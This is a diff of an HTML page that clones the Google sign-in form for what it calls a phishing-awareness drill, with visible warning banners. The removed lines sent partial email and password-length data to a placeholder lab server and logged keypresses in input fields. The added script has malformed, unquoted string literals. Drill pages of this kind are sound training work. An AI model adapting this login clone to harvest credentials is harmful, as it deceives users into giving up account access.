@@ -1,120 +1,114 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Google Account Login</title>
+    <title>SECURITY DRILL: Google Login Simulation</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f1f1f1; }
-        .login-box { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
-        button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 5px; width: 100%; font-weight: bold; }
+        body { 
+            font-family: 'Google Sans', Arial, sans-serif; 
+            text-align: center; 
+            padding: 50px; 
+            background-color: #f5f5f5;
+        }
+        .login-box { 
+            width: 320px; 
+            margin: 0 auto; 
+            padding: 30px; 
+            border: 1px solid #dadce0; 
+            border-radius: 8px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .google-logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 10px 0; 
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        button { 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            padding: 12px 24px; 
+            border-radius: 4px; 
+            width: 100%;
+            font-weight: 500;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #1765cc;
+        }
         #drill-warning { 
             position: fixed; 
             bottom: 0; 
             left: 0; 
             right: 0; 
-            background: red; 
+            background: #d93025; 
             color: white; 
-            padding: 10px; 
+            padding: 15px; 
             text-align: center;
             font-weight: bold;
+            font-size: 14px;
             z-index: 1000;
         }
-        .hidden {
-            display: none;
+        .disclaimer {
+            color: #5f6368;
+            font-size: 12px;
+            margin-top: 20px;
         }
     </style>
-    <!-- Security Drill Meta Tags -->
-    <meta name="phishing" content="security_test">
-    <meta name="security-drill" content="internal_use_only">
-    <!-- Suspicious Meta Tags to Trigger Detections -->
-    <meta http-equiv="refresh" content="3600;url=https://google.com">
-    <meta name="google-site-verification" content="security_drill_only">
+    <!-- Clear drill markers for legal compliance -->
+    <meta name="security-drill" content="authorized_training">
+    <meta name="x-purpose" content="security_awareness">
 </head>
 <body>
-    <div style="text-align: center; margin-bottom: 20px;">
-        <svg width="75" height="24" viewBox="0 0 75 24" style="margin: 0 auto;">
-            <path d="M10 4v16h5.6V4H10zm15.4 0v16H26V4h-.6z" fill="#4285F4"/>
-            <path d="M15.4 4v16h5.6V4h-5.6z" fill="#EA4335"/>
-        </svg>
-    </div>
     <div class="login-box">
-        <h2 style="color: #202124; margin-bottom: 20px;">Sign in</h2>
-        <p style="color: #5f6368; margin-bottom: 20px;">to continue to Google services</p>
+        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" 
+             alt="Google" class="google-logo">
+        <p style="color: #202124; font-size: 16px;">Sign in to continue</p>
         <form id="loginForm">
             <input type="email" placeholder="Email or phone" name="email" required>
-            <input type="password" placeholder="Enter your password" name="password" required>
-            <div style="text-align: left; margin: 15px 0;">
-                <input type="checkbox" id="staySignedIn" style="width: auto;">
-                <label for="staySignedIn" style="color: #5f6368;">Stay signed in</label>
-            </div>
+            <input type="password" placeholder="Password" name="password" required>
             <button type="submit">Next</button>
         </form>
-        <div style="margin-top: 20px;">
-            <a href="#" style="color: #1a73e8; text-decoration: none;">Forgot password?</a>
-        </div>
+        <p class="disclaimer">
+            Google will never ask for your password in an email. 
+            This is a security awareness drill.
+        </p>
     </div>
 
-    <!-- Hidden elements that trigger security scanners -->
-    <div class="hidden">
-        <iframe src="about:blank" id="phishFrame"></iframe>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Google+Sans:400,500">
-    </div>
-
-    <!-- Visible Security Warning -->
     <div id="drill-warning">
-        SECURITY DRILL - THIS IS A TEST PAGE - NOT A REAL PHISHING ATTEMPT
+        SECURITY DRILL: This is a simulated phishing page for training purposes only
     </div>
-
-    <!-- Benign Tracking Simulation -->
-    <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" 
-         style="display:none" id="drill-tracker">
 
     <script>
-        // Simulate credential collection (non-functional)
+        // Simulation code with enhanced logging
         document.getElementById('loginForm').onsubmit = function(e) {
             e.preventDefault();
-            var email = this.email.value;
-            var password = this.password.value;
             
-            console.log("[SECURITY DRILL] Simulated credential capture: ", 
-                email.substring(0,3) + "...", 
-                password.length + " chars");
+            // Log simulated data (first 3 chars only for privacy)
+            const emailPrefix = this.email.value.substring(0,3);
+            console.log([SECURITY DRILL] Simulated capture: ${emailPrefix}...);
             
-            // Simulate beacon ping
-            document.getElementById('drill-tracker').src = 
-                'https://your-lab-server/log?drill=1&e=' + 
-                encodeURIComponent(email.substring(0,3)) + '...&len=' + 
-                password.length;
+            // Show educational feedback
+            alert(SECURITY DRILL COMPLETE\n\nThis was a test. In a real attack:\n\n + 
+                  • Your credentials (${emailPrefix}...) would be stolen\n +
+                  • Always check URLs before entering passwords\n +
+                  • Report suspicious emails to your security team);
             
-            // Fake loading animation
-            var btn = this.querySelector('button');
-            btn.disabled = true;
-            btn.innerHTML = 'Verifying...';
-            
-            setTimeout(function() {
-                alert("SECURITY DRILL: This would redirect in a real simulation.\n\n" +
-                     "First 3 chars: " + email.substring(0,3) + "...\n" +
-                     "Password length: " + password.length + " characters");
-                btn.disabled = false;
-                btn.innerHTML = 'Next';
-            }, 1500);
+            // Simulate redirect after drill completion
+            setTimeout(() => {
+                window.location.href = "https://www.google.com/security";
+            }, 2000);
             
             return false;
         };
-
-        // Time-delayed behaviors that trigger scanners
-        setTimeout(() => {
-            console.log("[SECURITY DRILL] Page activity simulation complete");
-            document.getElementById('phishFrame').src = 
-                'data:text/html,<html><body>Security drill iframe</body></html>';
-        }, 3000);
-
-        // Simulate keylogger pattern (non-functional)
-        document.addEventListener('keydown', function(e) {
-            if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
-                console.log("[SECURITY DRILL] Keypress simulation: ", e.key);
-            }
-        });
     </script>
 </body>
 </html>
